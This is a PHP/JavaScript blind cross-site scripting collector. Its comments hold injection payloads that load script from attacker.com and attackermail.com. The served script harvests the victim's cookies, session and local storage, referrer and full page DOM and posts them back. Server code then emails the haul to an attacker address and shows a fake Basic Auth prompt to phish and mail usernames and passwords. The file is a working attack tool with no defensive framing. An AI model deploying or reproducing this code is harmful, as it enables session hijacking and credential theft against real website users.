<?php
// <script src="//attacker.com/xss-blind.php"></script>
// <svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//attackermail.com/xss-blind.php";d.body.appendChild(z)},0)>
header('Content-Type: text/javascript');
?>
var mhost = '<?php echo "//" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"] ?>';
var msg = 'User Agent\n' + navigator.userAgent + '\n\nTarget URL\n' + document.URL;
msg += '\n\nReferer URL\n' + document.referrer + '\n\nReadable Cookies\n' + document.cookie;
msg += '\n\nSession Storage\n' + JSON.stringify(sessionStorage) + '\n\nLocal Storage\n' + JSON.stringify(localStorage);
msg += '\n\nFull DOM\n' + document.documentElement.innerHTML;

var r = new XMLHttpRequest();
r.open('POST', mhost, true);
r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
r.send('origin=' + document.location.origin + '&msg=' + encodeURIComponent(msg));

<?php
header("Access-Control-Allow-Origin: " . $_POST["origin"]);
$origin = $_POST["origin"];
$to = "xss-blind@attackermail.com";
$subject = "XSS Blind Report for: " . $origin;
$ip = "Requester: " . $_SERVER["REMOTE_ADDR"] . "\nForwarded For: ". $_SERVER["HTTP_X_FORWARDED_FOR"];
$msg = $subject . "\n\nIP Address\n" . $ip . "\n\n" . $_POST["msg"];
$headers = "From: xssed@victim.org" . "\r\n";
if ($origin && $msg) {
  mail($to, $subject, $msg, $headers);
}
// Phishing for creds on HTTP Basic Auth protected Backends
if (!isset($_SERVER['PHP_AUTH_USER']) && !isset($_SERVER['PHP_AUTH_PW'])) {
  header("WWW-Authenticate: Basic realm=\"Protected Area\"");
  header("HTTP/1.0 401 Unauthorized");
} else {
  $subject2 = "XSS Blind Report: HTTP Basic Auth Creds";
  $msg2 = $_SERVER['PHP_AUTH_USER'] .":".$_SERVER['PHP_AUTH_PW'];
  mail($to, $subject2, $msg2, $headers);
}
?>
